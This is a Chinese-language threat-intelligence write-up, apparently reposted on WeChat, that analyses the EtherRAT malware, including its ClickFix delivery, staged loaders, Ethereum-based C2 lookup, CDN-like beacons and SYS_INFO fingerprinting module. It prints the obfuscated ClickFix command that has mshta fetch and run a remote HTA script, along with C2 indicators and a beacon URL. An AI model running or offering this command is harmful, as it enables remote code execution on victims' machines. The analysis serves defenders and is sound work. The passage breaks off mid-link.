---
title: EtherRAT 和 SYS_INFO 模块：以太坊上的 C2（EtherHiding）、目标选择、类似 CDN 的信标
url: https://mp.weixin.qq.com/s/hoFKXn_woInHHzUiQJemNw
source: Doonsec's feed
date: 2026-04-02
fetch_date: 2026-04-03T04:25:59.448616
---

# EtherRAT 和 SYS_INFO 模块：以太坊上的 C2（EtherHiding）、目标选择、类似 CDN 的信标

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/J7CSmJcRR8lUVE4TmH9cuwyUC2BNS6ib1jib9nT1tPaia2N1s1KPNjxn8ibhBSEyYUmkHSm09RasVpEaROu50ZauibDaSUYE4lyurMTMb7vibjbsQ/0?wx_fmt=jpeg)

# EtherRAT 和 SYS\_INFO 模块：以太坊上的 C2（EtherHiding）、目标选择、类似 CDN 的信标

Khan安全团队

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8koic3atIKfy2lur7b0BnzjCQCxgTgaALv2UpNwe2xWZoNQ6LIQorID8YVwKlStgymwseQgDibUAvxqibbO2uYmwtdDL8uK0wKibf4/640?wx_fmt=png&from=appmsg)

初始访问

观察到的 EtherRAT 事件的初始访问途径各不相同。在本案例中，TRU 观察到攻击者使用了 ClickFix；然而，在 TRU 观察到的大多数事件中，IT 支持诈骗都是通过 Microsoft Teams 进行的，随后攻击者会使用 QuickAssist。

ClickFix 命令使用了一种称为间接命令执行的技术，其中 LOLBin pcalua.exe为mshta.exe执行命令行，从而有效地绕过了限制命令行解释器使用的安全限制，并从被入侵的网站 shepherdsestates[.]uk 中检索名为“shep.hta”的恶意 HTA 脚本。此外，为了混淆命令行，还使用了插入符号“^”。

```
"C:\Windows\system32\cmd.exe" /min /c "p^c^a^l^u^a^.^e^x^e ^-a ^m^s^h^t^a^.^e^x^e ^-c ^h^t^t^p^s^:^/^/w^w^w^-^f^l^o^w^-^s^u^b^m^i^s^s^i^o^n^-^m^a^n^a^g^e^m^e^n^t^.^s^h^e^p^h^e^r^d^s^e^s^t^a^t^e^s^.^u^k^/^s^h^e^p^.^h^t^a^"
```

下面显示的是反混淆后的命令行内容。

```
"C:\Windows\system32\cmd.exe" /min /c "pcalua.exe -a mshta.exe -c hxxps://www-flow-submission-management.shepherdsestates[.]uk/shep.hta"
```

攻击图

下图展示了攻击的进展过程，从 ClickFix 进行初始访问开始，最终部署 EtherRAT，然后通过 C2 交付一个我们称之为“SYS\_INFO”的模块，该模块执行广泛的主机指纹识别——威胁行为者利用这些信息来支持目标选择和后续有效载荷的决策。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8mjm5OJ0k4bT01YQD0qwVqKllpW186ibALrvkt76FibXeVicTnhTX4dhcEic5FdamGr8cicmRk1b4pJEzFW1BVNd43Lwte1FrvByKzQ/640?wx_fmt=png&from=appmsg)

第一阶段

第一阶段的 Node.js 脚本仅用于解密/执行下一阶段。它使用 AES-256-CBC 加密算法解密文件“aeJ8aMT9ogQtKEb.dat”中的加密阶段有效载荷。它利用 Node.js 内部函数module.\_compile()在内存中运行下一阶段。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8lB64UvEbSWKgg73u1NuZbUkF2ibHwicvcQFbPfmXeVibFQibwD202lvVTQDXJickJqkxuGrBicBKDxYzzzoCL9YY8qmKibhXJ0yLbrKk/640?wx_fmt=png&from=appmsg)

使用 CyberChef，我们可以看到下一阶段解密后的明文。这是一个简单的过程，首先使用 AES 解密操作，并将嵌入的 AES 密钥/初始化向量指定为 BASE64 编码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8kNiapngGBaia82y5AibJ926GXESQsYicZySDtXicRNxksG6ZLHBGriaMtic7Qs8ibibeYmIZcqjm1ZBWicBKU54fCP6yC6oibttxWBNfcv00/640?wx_fmt=png&from=appmsg)

第二阶段

根据此阶段的外观和功能，我们推断它已通过Obfuscator.io进行混淆，用于解密/启动 EtherRAT 并通过 HKCU Run 密钥建立持久化连接。EtherRAT 的加密代码存储在一个名为“2htgIPQLUYA3aWq.cfg”的看似无害的文件中。

该脚本使用 Node 的 crypto 模块，通过 AES-256-CBC 算法解密此文件。解密过程中，AES 密钥和初始化向量 (IV) 以 base64 编码字符串的形式嵌入到此阶段。解密得到的明文（混淆后的 EtherRAT）被写入磁盘，文件名为“TLHA1IlxoF.bin”，并通过 child\_process.spawn() 函数执行。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8l6uLGIWUbnT1lVDmHhe0cqHBpfgCcl8nr3sy1SZ4kawxxd86uKrLp4ibzqLEvHzsRDUdHB4vTknUnCVib92g17WRrDGxH5ou0SU/640?wx_fmt=png&from=appmsg)

此阶段的下一部分会生成一个随机的 12 位十六进制字符串，用作 HKCU Run 项中新注册表值的名称。该注册表项通过 LOLBin 的reg.exe创建，从而有效地为 EtherRAT 建立持久性。

相关代码和生成的命令行如下图所示。值得注意的是，该命令使用conhost.exe （Windows 控制台主机）通过未公开的--headless参数代理执行node.exe。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8lrx6e140d5CULIxvwVhqv7OLcwZEZVyhau3z86bK9bbibjWhgNCJ3RdNckUID3g9MaliaJibvlaNGWYRNb0vsCM3AH6ETqWicTa6U/640?wx_fmt=png&from=appmsg)

第三阶段（EtherRAT）

最后阶段是 EtherRAT，这是一个 Node.js 脚本，它与 RPC 提供商通信以获取 C2 地址，并允许攻击者从其控制的 C2 服务器执行任意代码。它通过随机生成的、看似无害的“类似 CDN”的 URL 轮询 C2 服务器以获取要执行的代码。

与前一阶段一样，考虑到存在一个大型字符串数组以及在运行时重新排序的洗牌循环，它很可能也是通过Obfuscator.io进行混淆的。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8mOjWtjByTtUUmfTJFR41K04ias3IetdKezJL4fyzp0LUNDYh0KAFonib7MGfEjeMVEGrAN4Kmwf8W0DQRSSYVu6Ktn9ib9hlecnM/640?wx_fmt=png&from=appmsg)

@ben-sb有一个现有的开源项目，可以很好地处理 Obfuscator.io 混淆，但是由于“isBasicStringArrayWrapper”函数中的假设，它对本次事件中的样本不起作用，该假设假定负责按索引返回字符串的函数具有特定的结构。

在我们的例子中，该函数没有重新定义自身，并且包含多个“死代码”语句，有效地破坏了 isBasicStringArrayWrapper 函数中现有的模式匹配。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8lYiahKPHx9LNVMCPERAxoIpecDqjMUx8JD9Ugm2CrAbNia45NbndiazYKc85TibNtG2VDJbtdkmwiaEhCtKVQ0pknNUborg4xR1gTI/640?wx_fmt=png&from=appmsg)

我们在代码仓库中创建了这个拉取请求来处理这类混淆问题。最终，它应该会成为网页版反混淆器的一部分。在此期间，您可以使用以下命令，通过fork 后的仓库来使用此技术反混淆脚本：

```
git clone https://github.com/YungBinary/obfuscator-io-deobfuscator.gitcd obfuscator-io-deobfuscator npm install node ./dist/cli.js path/to/obfuscated.js -o path/to/deobfuscated.js
```

通过 EtherHiding 获取 C2 地址

EtherHiding 是一种在恶意软件中越来越流行的技术，它允许威胁行为者通过交易或智能合约输入数据将恶意代码或配置数据嵌入以太坊区块链，从而形成一个无法被移除的存储介质。

除了具备抗攻击能力外，威胁行为者还会进行额外的交易，将先前受感染的机器重定向到新的 C2 基础设施，从而以少量加密货币的代价有效地重新控制旧的受感染机器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8lVkibvic8a9icR8A3IA2PCPp7Vj8jtNmB3SwTibEjfHAY6FZPicwAgkTUkIJ2AciaSp7BCrnQCUtQ1nVPUYPQZNnU2OmskBrdMCmgNE/640?wx_fmt=png&from=appmsg)

本次事件中出现的以太坊智能合约地址0xe26c57b7fa8de030238b0a71b3d063397ac127d3频繁出现在 eSentire 与 EtherRAT 相关的案例数据中，并且还与针对商业服务、软件和金融行业其他客户的攻击有关。这些攻击活动涉及通过 Microsoft Teams 和 QuickAssist 进行未经授权的远程访问，从而实施 IT 支持诈骗。

与我们之前博文中提到的其他 Node.js 恶意软件类似，EtherRAT 会同时向所有 RPC 提供商发送请求，并评估响应，找出最常用的 C2 地址。这使得攻击者能够使用 setString 函数将高优先级 C2 服务器地址存储在现有的智能合约中，从而刷新可能已无法连接到有效 C2 服务器的僵尸程序的 C2 地址。

此过程中使用的所有 RPC 提供程序如下：

```
https://eth.llamarpc.comhttps://mainnet.gateway.tenderly.cohttps://rpc.flashbots.net/fasthttps://rpc.mevblocker.iohttps://eth-mainnet.public.blastapi.iohttps://ethereum-rpc.publicnode.comhttps://rpc.payload.dehttps://eth.drpc.orghttps://eth.merkle.io
```

通过在EtherScan.io 上搜索智能合约并导航到“事件”，我们可以看到威胁行为者反复使用 setString 函数来存储其他 C2 地址的事件列表。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8mpnmo4UvDoQmR93icLicWCke6NX0CON9vS62nHO2iaNDQ9fnc0NUXicSThrrPQopYWgay3OpetHEaQWY9yz8TOYKKabq81LnMPTa4/640?wx_fmt=png&from=appmsg)

C2通信

一旦恶意软件从以太坊区块链中检索到 C2 地址，它就会构建最终的信标 URL，使其看起来像一个良性的 CDN 请求，使用常见的“ /api/ ”路径、随机的十六进制目录“ 5f459179 ”、一个 UUID 和一个无害的静态文件名“ .ico ”。

生成的URL格式如下代码片段所示：

```
<C2_ADDRESS>/api/<RANDOM_8_HEXADECIMAL_CHARS>/<RANDOM_UUID>/ <RANDOM_8_HEXADECIMAL_CHARS>.<RANDOM_EXTENSION>?<RANDOM_QUERY_PARAMETER>=<BUILD_ID>
```

例如，我们看到了向以下 URL 发送的信标：

```
hxxps://aurineuroth[.]com/api/5f459179/29e96c95-62a5-49e5-a8ba-7ebfbf560ab7/b435a6b1.ico?b=9e2f9c07-f85a-4089-8669-186f56bca7b3
```

在构建此 URL 时，EtherRAT 会随机选择以下每种“文件扩展名”和查询参数中的一个：

文件扩展名： png、jpg、gif、css、ico、webp

查询参数： id、token、key、b、q、s、v

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8koIxIcp70oLXo0GzUldmDfJHnicPNoX8D8l3dGYCXgnMkVrVP7hUGGE5PjYgibfXibAasXXTImERfe0RnhhHLaurweSqqQtMTHv8/640?wx_fmt=png&from=appmsg)

如果配置正确，EtherRAT 会将调试日志写入%APPDATA%\svchost.log。修改脚本，将用于启用或禁用调试日志的默认值 false 改为 true，可以有效地进行分析。下图显示了恶意软件从以太坊区块链获取 C2 服务器并开始轮询命令后日志文件的内容。

TRU 观察到 EtherRAT 使用 TLS 1.3 通过 HTTPS 进行通信，这阻止了对 PCAP 捕获中 HTTP 特定恶意软件流量的检查，因此，使用此技术并动态重写恶意软件有助于从 C2 基础设施转储请求和响应。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8kMCqicibnv4OoRteib0oYKprTw0S2MsSRIKgU8fJseg6Fq1ASxqq4XFF0XPvQiaDn9AX27omDhk7BKkIhYudyiaa7DevaUqBlZwEgk/640?wx_fmt=png&from=appmsg)

重新混淆

EtherRAT 会通过 POST 请求以 JSON 格式向 C2 服务器发送当前的 EtherRAT 源代码来进行重新混淆。如果重新混淆请求成功，它会用 C2 服务器返回的响应覆盖自身并重新启动。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8l15U7YxYF23UAsHHNR4Licbo21vjWaKA9al9TzwS6B1QdusvkeEia2BPsyia9q52J3Y1E5yG1m3aYnyevro2XC32KGWQBvle0Oyg/640?wx_fmt=png&from=appmsg)

EtherRAT SYS\_INFO 模块

在我们的分析中，TRU 观察到位于 aurineuroth[.]com（IP 地址 185.218.19.162，ASN#400992，名称“周义卫星通信”）的 EtherRAT C2 服务器返回了额外的待执行代码。该代码负责执行攻击图（图 1）和下方“入侵指标”表中所示的指纹识别命令，并且在整个过程中频繁引用“SYS\_INFO”信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8m5pLMy2baVwKfvRxbjFFXWmrlUPHUFZ5MtIUFaEYZ7EiaDqViaBs6MWRgS6pVyAdP3hlc9JG6kDiawhwoX5nFuwMPoNWfhaLUe7w/640?wx_fmt=png&from=appmsg)

在从受害计算机收集全面信息之前，该程序会检查受害计算机是否使用独联体国家/地区的语言。检查的语言包括：俄语、白俄罗斯语、哈萨克语、吉尔吉斯语、塔吉克语、乌兹别克语、亚美尼亚语、阿塞拜疆语和格鲁吉亚语。

如果任何语言匹配，程序将“自毁”，即删除自身并退出。对于 Windows 系统，使用特定的 PowerShell 命令；而对于其他操作系统，则会检查环境变量“ LANG ”和“ LC\_ALL ”。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8mF9Ey3rt48b8hmecgpKLO0vbGKd4bKbXSr8uekAHOkZlbT3nMA4ogsqaibT10c7ITFKmpa3G97E50vnUPKQ2ZibduHZG5RAEIww/640?wx_fmt=png&from=appmsg)

它会从受害计算机收集以下信息：

```
通过向以下 URL 发送 GET 请求获取受害机器的公网 IP 地址（第一个是主地址，其他是备用地址）：https://api.ipify.org?format=jsonhttps://api.my-ip.io/v2/ip.jsonhttps://api64.ipify.org?format=json通过 os.cpus() 建立 CPU 模型用户名通过 os.userInfo().username通过 os.hostname() 获取计算机名通过 os.platform() 获取操作系统平台名称通过 os.release() 获取操作系统版本信息通过 os.arch() 获取操作系统架构总内存、可用内存、系统运行时间、用户主目录、临时目录、Node 版本通过 os.networkInterfaces() 获取 MAC 地址
```

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8kAVtJu1vzkTghDaV8G85cBIadT43njDBbIYd6gtGh3WIHkwDh1fKVG0VwTcc4WQosRhkcF2SLfHOdiaKZLS6HXPMdNGcUVCWgc/640?wx_fmt=pn...